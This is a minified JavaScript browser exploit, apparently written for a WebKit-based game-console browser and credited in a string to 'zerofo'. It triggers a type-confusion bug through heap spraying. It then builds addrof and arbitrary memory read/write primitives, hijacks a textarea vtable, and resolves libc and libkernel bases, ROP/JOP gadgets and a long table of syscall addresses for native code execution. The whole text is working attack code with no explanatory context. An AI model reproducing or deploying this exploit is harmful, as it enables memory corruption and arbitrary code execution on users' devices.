    var leaker_obj={'a':0};var leaker_arr=new Uint32Array(1024);var oob_slave=new Uint8Array(65536);var oob_master=new Uint32Array(1024);var spray=[];var spray_one=function(){var x=new Uint32Array(1);x[spray.length+'spray']=123;spray.push(x)};for(var i=0;i<0x10000;i++){spray_one()};var target={'a':2.1100820415101592e-303,'b':false,'c':true,'d':65536};var target2={'a':2.1100820415101592e-303,'b':false,'c':true,'e':65536};var impl_idx=0;var create_impl=function(){var ans={'a':target};for(var i=0;i<256;i++)ans[(impl_idx++)+'x']={};return ans};var trigger=function(x){ var o={'a':1};for(var i in o){{i=x;function i(){return i}}o[i]}if(impl.a!=target){target.c=leaker_obj;leaker_obj.a=leaker_obj;var l1=impl.a[4];var l2=impl.a[5];leaker_obj.a=oob_slave;var s1=impl.a[4];var s2=impl.a[5];target.c=leaker_arr;impl.a[4]=l1;impl.a[5]=l2;target.c=oob_master;impl.a[4]=s1;impl.a[5]=s2;impl.a=target;throw"exploit finished, modify by zerofo.";}};try{for(_=0;_<2048;_++){var impl=create_impl();var s={'a':impl};trigger(s)}}catch(e){};var i48_put=function(x,a){a[4]=x|0;a[5]=(x/4294967296)|0};var i48_get=function(a){return a[4]+a[5]*4294967296};var addrof=function(x){leaker_obj.a=x;return i48_get(leaker_arr)};var read_mem_setup=function(p,sz){i48_put(p,oob_master);oob_master[6]=sz};var read_mem=function(p,sz){read_mem_setup(p,sz);var arr=[];for(var i=0;i<sz;i++)arr.push(oob_slave[i]);return arr};var read_mem_b=function(p,sz){read_mem_setup(p,sz);var b=new Uint8Array(sz);b.set(oob_slave);return b};var read_mem_as_string=function(p,sz){var x=read_mem_b(p,sz);var ans='';for(var i=0;i<x.length;i++)ans+=String.fromCharCode(x[i]);return ans};var write_mem=function(p,data){i48_put(p,oob_master);oob_master[6]=data.length;for(var i=0;i<data.length;i++)oob_slave[i]=data[i]};var read_ptr_at=function(p){var ans=0;var d=read_mem(p,8);for(var i=7;i>=0;i--)ans=256*ans+d[i];return ans};var write_ptr_at=function(p,d){var arr=[];for(var i=0;i<8;i++){arr.push(d&0xff);d/=256}write_mem(p,arr)};var malloc_nogc=[];var malloc=function(sz){var arr=new Uint8Array(sz);malloc_nogc.push(arr);return read_ptr_at(addrof(arr)+0x10)};var tarea=document.createElement("textarea");var real_vt_ptr=read_ptr_at(addrof(tarea)+24);var fake_vt_ptr=malloc(1024);write_mem(fake_vt_ptr,read_mem(real_vt_ptr,1024));var real_vtable=read_ptr_at(fake_vt_ptr);var fake_vtable=malloc(8192);write_mem(fake_vtable,read_mem(real_vtable,8192));write_ptr_at(fake_vt_ptr,fake_vtable);var fake_vt_ptr_bak=malloc(1024);write_mem(fake_vt_ptr_bak,read_mem(fake_vt_ptr,1024));var plt_ptr=read_ptr_at(fake_vtable)-10063176;function get_got_addr(idx){var p=plt_ptr+idx*16;var q=read_mem(p,6);if(q[0]!=255||q[1]!=37){throw"invalid GOT entry"}var offset=0;for(var i=5;i>=2;i--){offset=offset*256+q[i]}offset+=p+6;return read_ptr_at(offset)}var webkit_base=read_ptr_at(fake_vtable);try{var libkernel_base=get_got_addr(705)-65536;var libc_base=get_got_addr(582);var saveall_addr=libc_base+189128;var loadall_addr=libc_base+206684;var setjmp_addr=libc_base+785120;var longjmp_addr=libc_base+785200;var pivot_addr=libc_base+206802;var infloop_addr=libc_base+280480;var jop_frame_addr=libc_base+464336;var get_errno_addr_addr=libkernel_base+40944;var pthread_create_addr=libkernel_base+63872;function pivot(buf){var ans=malloc(1024);var bak=read_ptr_at(fake_vtable+472);write_ptr_at(fake_vtable+472,saveall_addr);write_ptr_at(addrof(tarea)+24,fake_vt_ptr);tarea.scrollLeft=0;write_ptr_at(addrof(tarea)+24,real_vt_ptr);write_mem(ans,read_mem(fake_vt_ptr,1024));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,1024));var bak=read_ptr_at(fake_vtable+472);write_ptr_at(fake_vtable+472,pivot_addr);write_ptr_at(fake_vt_ptr+56,buf);write_ptr_at(ans+56,read_ptr_at(ans+56)-16);write_ptr_at(buf,ans);write_ptr_at(addrof(tarea)+24,fake_vt_ptr);tarea.scrollLeft=0;write_ptr_at(addrof(tarea)+24,real_vt_ptr);write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,1024))};;var sys_30_addr=libkernel_base+0x1f550;var sys_104_addr=libkernel_base+0x20ad0;var sys_6_addr=libkernel_base+0x210f0;var sys_98_addr=libkernel_base+0x1fcc0;var sys_2_addr=libkernel_base+0x209b0;var sys_20_addr=libkernel_base+0x20670;var sys_118_addr=libkernel_base+0x216b0;var sys_534_addr=libkernel_base+0x20710;var sys_533_addr=libkernel_base+0x1f1d0;var sys_363_addr=libkernel_base+0x1f060;var sys_362_addr=libkernel_base+0x1f040;var sys_106_addr=libkernel_base+0x21210;var sys_477_addr=libkernel_base+0x21070;var sys_240_addr=libkernel_base+0x20340;var sys_3_addr=libkernel_base+0x1fb80;var sys_105_addr=libkernel_base+0x20b50;var sys_23_addr=libkernel_base+0x1f470;var sys_416_addr=libkernel_base+0x20220;var sys_97_addr=libkernel_base+0x215f0;var sys_4_addr=libkernel_base+0x1f150;var sys_5_addr = libkernel_base + 0x1f0a0;var sys_133_addr = libkernel_base + 0x21770;var sys_136_addr = libkernel_base + 0x1f0e0;var sys_134_addr = libkernel_base + 0x1f720;var sys_137_addr = libkernel_base + 0x20d70;var sys_10_addr = libkernel_base + 0x1ff10;var sys_608_addr = libkernel_base + 0x203c0;var sys_591_addr = libkernel_base + 0x20cd0;var sys_594_addr = libkernel_base + 0x20b70;var sys_488_addr = libkernel_base + 0x1ff70;var cpuset_setaffinity_addr = sys_488_addr;var dynlib_get_info_ex_addr = sys_608_addr;var dynlib_dlsym_addr = sys_591_addr;var dynlib_load_prx_addr = sys_594_addr;var unlink_addr = sys_10_addr;var rmdir_addr = sys_137_addr;var open_addr = sys_5_addr;var mkdir_addr = sys_136_addr;var shutdown_addr = sys_134_addr;var accept_addr=sys_30_addr;var bind_addr=sys_104_addr;var close_addr=sys_6_addr;var connect_addr=sys_98_addr;var fork_addr=sys_2_addr;var getpid_addr=sys_20_addr;var getsockopt_addr=sys_118_addr;var jitshm_alias_addr=sys_534_addr;var jitshm_create_addr=sys_533_addr;var kevent_addr=sys_363_addr;var kqueue_addr=sys_362_addr;var listen_addr=sys_106_addr;var mmap_addr=sys_477_addr;var nanosleep_addr=sys_240_addr;var read_addr=sys_3_addr;var setsockopt_addr=sys_105_addr;var setuid_addr=sys_23_addr;var sendto_addr = sys_133_addr;var sigaction_addr=sys_416_addr;var socket_addr=sys_97_addr;var write_addr=sys_4_addr;WK=1;}catch(e){WK=0;}